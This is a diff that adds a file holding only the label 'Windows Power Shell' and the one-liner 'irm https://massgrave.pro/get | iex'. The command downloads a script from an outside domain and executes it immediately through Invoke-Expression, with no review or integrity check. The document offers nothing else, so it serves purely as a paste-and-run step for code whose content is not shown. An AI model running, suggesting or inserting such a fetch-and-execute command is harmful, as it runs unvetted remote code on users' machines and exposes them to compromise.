@@ -1,0 +1,2 @@
+Windows Power Shell
+irm https://massgrave.pro/get | iex 
